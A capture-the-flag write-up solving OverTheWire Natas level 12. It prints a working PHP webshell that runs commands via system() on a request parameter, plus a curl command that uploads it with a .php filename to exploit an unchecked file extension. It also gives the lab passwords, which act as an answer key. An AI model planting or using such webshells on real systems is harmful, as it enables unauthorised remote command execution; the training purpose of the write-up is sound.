# Natas Level 12

```bash
Username: natas12
Password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
URL:      http://natas12.natas.labs.overthewire.org
```
We enter the site, and see the following page:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas12.png" />
    <div align="center">Natas 12</div>
</figure>

Clicking on the "View sourcecode" link:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas12-view-sourcecode.png" />
    <div align="center">Natas 12 - View sourcecode</div>
</figure>

Lets understand the script:
```php
function genRandomString() { 
    $length = 10; 
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz"; 
    $string = "";     

    for ($p = 0; $p < $length; $p++) { 
        $string .= $characters[mt_rand(0, strlen($characters)-1)]; 
    } 

    return $string; 
} 

function makeRandomPath($dir, $ext) { 
    do { 
        $path = $dir."/".genRandomString().".".$ext; 
    } while(file_exists($path)); 
    return $path; 
} 

function makeRandomPathFromFilename($dir, $fn) { 
    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
    return makeRandomPath($dir, $ext); 
} 

if(array_key_exists("filename", $_POST)) { 
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); 

    if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
        echo "File is too big"; 
    } else { 
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
        } else{ 
            echo "There was an error uploading the file, please try again!"; 
        } 
    } 
} else {
```
<em>(The last "else" is probably a mistake).</em>

<em>genRandomString</em> just returns random string of size 10 (from the chars: 0123456789abcdefghijklmnopqrstuvwxyz).

<em>makeRandomPath</em> have two arguments: dir, ext.
It returns the concatenation dir +"/" +  "random string" + "." + ext

<em>makeRandomPathFromFilename</em> have two arguments as well: dir, fn.
It splits the last extension of fn and returns "random path from filename" with this extension (in the specific dir).

The script stores in $target_path unique filename (in the dir: uploads) and the uploaded file, then it checks that the file isn't too big (less or equal to 1000 bytes) and then trying to upload the file into the $target_path

Lets try to upload a simple PHP webshell (save as a local file and upload it):

```php
<?php

if(isset($_REQUEST['cmd'])){
echo "<pre>";
$cmd = ($_REQUEST['cmd']);
system($cmd);
echo "</pre>";
die;
}

?>
```
We can see that the filename hidden value have .jpg extension, so we need to change it to .php, lets use cURL again:

```bash
curl -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 --form uploadedfile=@PHP-webshell.php --form filename=shell.php http://natas12.natas.labs.overthewire.org
```

The result I got is:
```bash
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas12", "pass": "EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3" };</script></head>
<body>
<h1>natas12</h1>
<div id="content">
The file <a href="<strong>upload/6imq7a1ubt.php</strong>">upload/6imq7a1ubt.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

So, I just need to send the GET parameter (cmd) to upload/6imq7a1ubt.php

Lets try a dummy [command](http://natas12.natas.labs.overthewire.org/upload/6imq7a1ubt.php?cmd=hostname) (cmd="hostname"):
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas12-webshell-demo.png" />
    <div align="center">Natas 12 - Webshell demo</div>
</figure>
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas12-webshell.png" />
    <div align="center">Natas 12 - Webshell</div>
</figure>

We got the password for the next level: **jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY**